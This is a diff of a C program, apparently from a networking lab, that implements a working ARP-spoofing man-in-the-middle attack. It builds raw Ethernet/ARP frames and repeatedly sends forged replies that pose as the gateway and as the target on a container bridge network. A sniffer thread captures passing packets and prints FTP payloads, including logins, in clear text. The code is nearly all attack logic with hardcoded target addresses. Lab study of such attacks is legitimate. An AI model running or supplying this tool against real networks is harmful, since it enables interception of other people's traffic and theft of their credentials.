@@ -12,28 +12,73 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <pthread.h>
+#include <ctype.h>
 
 #define ETH_HDR_LEN 14
 #define ARP_PKT_LEN 28
 
-struct eth_hdr {
+
+typedef struct eth_h {
     unsigned char dest_mac[6];
     unsigned char src_mac[6];
-    unsigned short ethertype;
-};
+    unsigned short protocol;
+} eth_hdr;
 
-struct arp_hdr {
-    unsigned short hw_type;   
-    unsigned short proto_type;
-    unsigned char hw_size;    
-    unsigned char proto_size;
-    unsigned short opcode; 
+typedef struct arp_h {
+    unsigned short hw_type;
+    unsigned short protocol_type;
+    unsigned char hw_size;
+    unsigned char protocol_size;
+    unsigned short opcode;
     unsigned char sender_mac[6];
     unsigned char sender_ip[4];
     unsigned char target_mac[6];
     unsigned char target_ip[4];
-};
+} arp_hdr;
 
+
+void send_arp_reply(char* iface, char* target_mac, char* your_mac, char* gateway_ip, char* target_ip)
+{
+  
+    int sockfd;
+    unsigned char buffer[ETH_HDR_LEN + ARP_PKT_LEN];
+    eth_hdr *eth = (eth_hdr *)buffer;
+    arp_hdr *arp = (arp_hdr *)(buffer + ETH_HDR_LEN);
+    struct sockaddr_ll socket_address = {0};
+    struct ifreq ifr;
+    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (sockfd < 0) {
+        perror("Socket creation failed");
+        exit(EXIT_FAILURE);
+    }
+    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
+    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
+        perror("IOCTL failed");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+    socket_address.sll_ifindex = ifr.ifr_ifindex;
+    memcpy(eth->dest_mac, ether_aton(target_mac), 6);
+    memcpy(eth->src_mac, ether_aton(your_mac), 6);
+    eth->protocol = htons(0x0806);
+    arp->hw_type = htons(1);
+    arp->protocol_type = htons(0x0800);
+    arp->hw_size = 6;
+    arp->protocol_size = 4;
+    arp->opcode = htons(2);
+    memcpy(arp->sender_mac, ether_aton(your_mac), 6);
+    inet_pton(AF_INET, gateway_ip, arp->sender_ip);
+    memcpy(arp->target_mac, ether_aton(target_mac), 6);
+    inet_pton(AF_INET, target_ip, arp->target_ip);
+    memcpy(socket_address.sll_addr, ether_aton(target_mac), 6);
+    socket_address.sll_halen = ETH_ALEN;
+    if (sendto(sockfd, buffer, ETH_HDR_LEN + ARP_PKT_LEN, 0,
+               (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+        perror("Failed to send packet");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+}
 void print_hex_ascii(const unsigned char *data, int len) {
     int i, j;
     for(i = 0; i < len; i++) {
@@ -63,58 +108,56 @@ void print_hex_ascii(const unsigned char *data, int len) {
     }
     printf("\n");
 }
+void print_packet(unsigned char * buffer,size_t size)
+{
+    struct ethhdr *eth = (struct ethhdr *)buffer;
+    struct iphdr *ip = (struct iphdr *)(buffer + ETH_HDR_LEN);
+    struct tcphdr *tcp = (struct tcphdr *)(buffer + ETH_HDR_LEN + sizeof(struct iphdr));
+    unsigned char *payload = buffer + ETH_HDR_LEN + ip->ihl * 4 + tcp->doff * 4;
+    int payload_len = ntohs(ip->tot_len) - ip->ihl * 4 - tcp->doff * 4;
 
-void print_packet(unsigned char *buffer, int size) {
-    struct eth_hdr *eth = (struct eth_hdr *)buffer;
-    struct iphdr *iph = (struct iphdr*)(buffer + ETH_HDR_LEN);
-    
-    printf("\n\n=== Ethernet Header ===\n");
-    printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-           eth->src_mac[0], eth->src_mac[1], eth->src_mac[2],
-           eth->src_mac[3], eth->src_mac[4], eth->src_mac[5]);
-    printf("Dest MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-           eth->dest_mac[0], eth->dest_mac[1], eth->dest_mac[2],
-           eth->dest_mac[3], eth->dest_mac[4], eth->dest_mac[5]);
-    
-    // Print IP Header
-    printf("\n=== IP Header ===\n");
-    printf("IP Version: %d\n", (iph->version));
-    printf("IP Header Length: %d Bytes\n", ((iph->ihl) * 4));
-    printf("Type of Service: %d\n", (iph->tos));
-    printf("Total Length: %d Bytes\n", ntohs(iph->tot_len));
-    printf("TTL: %d\n", (iph->ttl));
-    printf("Protocol: %d\n", (iph->protocol));
-    printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
-    printf("Dest IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));
-
-    if (iph->protocol == IPPROTO_TCP) {
-        struct tcphdr *tcph = (struct tcphdr*)(buffer + ETH_HDR_LEN + iph->ihl * 4);
+    if (ip->protocol == IPPROTO_TCP && payload_len > 0) {
+        printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+            eth->h_source[0], eth->h_source[1], eth->h_source[2],
+            eth->h_source[3], eth->h_source[4], eth->h_source[5]);
+        printf("Destination MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+                eth->h_dest[0], eth->h_dest[1], eth->h_dest[2],
+                eth->h_dest[3], eth->h_dest[4], eth->h_dest[5]);
+        printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&ip->saddr));
+        printf("Dest IP: %s\n", inet_ntoa(*(struct in_addr *)&ip->daddr));
+        printf("Source Port: %d\n", ntohs(tcp->source));
+        printf("Dest Port: %d\n", ntohs(tcp->dest));
+        uint16_t src_port = ntohs(tcp->source);
+        uint16_t dst_port = ntohs(tcp->dest);
         
-        printf("\n=== TCP Header ===\n");
-        printf("Source Port: %d\n", ntohs(tcph->source));
-        printf("Dest Port: %d\n", ntohs(tcph->dest));
-        printf("Sequence Number: %u\n", ntohl(tcph->seq));
-        printf("Acknowledge Number: %u\n", ntohl(tcph->ack_seq));
-        printf("Header Length: %d Bytes\n", (tcph->doff * 4));
-        printf("Flags:\n");
-        printf("  URG: %d, ACK: %d, PSH: %d\n", tcph->urg, tcph->ack, tcph->psh);
-        printf("  RST: %d, SYN: %d, FIN: %d\n", tcph->rst, tcph->syn, tcph->fin);
-        
-        unsigned char *payload = buffer + ETH_HDR_LEN + (iph->ihl * 4) + (tcph->doff * 4);
-        int payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - (tcph->doff * 4);
-        
-        if (payload_len > 0) {
-            printf("\n=== Payload Data ===\n");
-            print_hex_ascii(payload, payload_len);
+        if (src_port == 21 || dst_port == 21 || 
+            src_port == 20 || dst_port == 20 || 
+            src_port > 21000 || dst_port > 21000) {  
+            printf("\n=== FTP Content ===\n");
+            for(int i = 0; i < payload_len; i++) {
+                if (isprint(payload[i]) || payload[i] == '\n' || payload[i] == '\r') {
+                    printf("%c", payload[i]);
+                }
+            }
+            printf("\n=================\n");
         }
     }
-    printf("\n==============================================\n");
 }
 
 void* sniff_packets(void *arg) {
     int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    const char *iface = "br-ef81d046a1ff";
+    unsigned int ifindex = if_nametoindex(iface);
+    struct sockaddr_ll addr = {0};
+    memset(&addr, 0, sizeof(struct sockaddr_ll));
+    addr.sll_family = AF_PACKET;
+    addr.sll_ifindex = ifindex;
+    addr.sll_protocol = htons(ETH_P_ALL);
+    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr_ll)) < 0) {
+        perror("Failed to bind socket");
+        exit(EXIT_FAILURE);
+    }
     unsigned char buffer[65536];
-
     while (1) {
         int data_size = recvfrom(sockfd, buffer, 65536, 0, NULL, NULL);
         if (data_size > 0) {
@@ -124,81 +167,20 @@ void* sniff_packets(void *arg) {
     return NULL;
 }
 
-void send_arp_reply(const char *iface, const char *target_ip, const char *gateway_ip, const char *your_mac, const char *target_mac) {
-    int sockfd;
-    unsigned char buffer[ETH_HDR_LEN + ARP_PKT_LEN];
-    struct eth_hdr *eth = (struct eth_hdr *)buffer;
-    struct arp_hdr *arp = (struct arp_hdr *)(buffer + ETH_HDR_LEN);
-    struct sockaddr_ll socket_address = {0};
-    struct ifreq ifr;
-
-    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    if (sockfd < 0) {
-        perror("Socket creation failed");
-        exit(EXIT_FAILURE);
-    }
-
-    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
-    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
-        perror("IOCTL failed");
-        close(sockfd);
-        exit(EXIT_FAILURE);
-    }
-    socket_address.sll_ifindex = ifr.ifr_ifindex;
-
-    memcpy(eth->dest_mac, ether_aton(target_mac), 6); 
-    memcpy(eth->src_mac, ether_aton(your_mac), 6);  
-    eth->ethertype = htons(0x0806);                 
-
-
-    arp->hw_type = htons(1);             
-    arp->proto_type = htons(0x0800);      
-    arp->hw_size = 6;                  
-    arp->proto_size = 4;               
-    arp->opcode = htons(2);          
-    memcpy(arp->sender_mac, ether_aton(your_mac), 6); 
-    inet_pton(AF_INET, gateway_ip, arp->sender_ip);
-    memcpy(arp->target_mac, ether_aton(target_mac), 6); 
-    inet_pton(AF_INET, target_ip, arp->target_ip);  
-
-
-    memcpy(socket_address.sll_addr, ether_aton(target_mac), 6);
-    socket_address.sll_halen = ETH_ALEN;
-
-    if (sendto(sockfd, buffer, ETH_HDR_LEN + ARP_PKT_LEN, 0,
-               (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-        perror("Failed to send packet");
-        close(sockfd);
-        exit(EXIT_FAILURE);
-    }
-
-    printf("ARP reply sent to %s (%s), spoofing as gateway (%s)\n", target_ip, target_mac, gateway_ip);
-
-    close(sockfd);
-}
-
 int main() {
-    const char *iface = "enp0s3";                
-    const char *target_ip = "10.14.1.1";        
-    const char *gateway_ip = "10.14.1.2";       
-    const char *your_mac = "08:00:27:ad:ee:45";    
-    const char *target_mac = "00:be:43:9b:c9:99"; 
-    const char *gateway_mac = "00:be:43:9b:69:f2"; 
-
+    int turn = 0;
     pthread_t sniff_thread;
+    char *iface = "br-ef81d046a1ff";
+    char *target_ip = "172.18.0.3";
+    char *gateway_ip = "172.18.0.2";
+    char *your_mac = "02:42:46:6f:8f:09";
+    char *target_mac = "02:42:ac:12:00:03";
     pthread_create(&sniff_thread, NULL, sniff_packets, NULL);
-
-    printf("Starting bidirectional ARP poisoning...\n");
-    
     while (1) {
-       
-        send_arp_reply(iface, target_ip, gateway_ip, your_mac, target_mac);
-        
-      
-        send_arp_reply(iface, gateway_ip, target_ip, your_mac, gateway_mac);
-        
-        sleep(3); 
+        send_arp_reply(iface, target_mac, your_mac, gateway_ip, target_ip);
+        send_arp_reply(iface, "02:42:ac:12:00:02", your_mac,target_ip, "172.18.0.2");
+        sleep(5);
+        turn++;
     }
-
     return 0;
 }
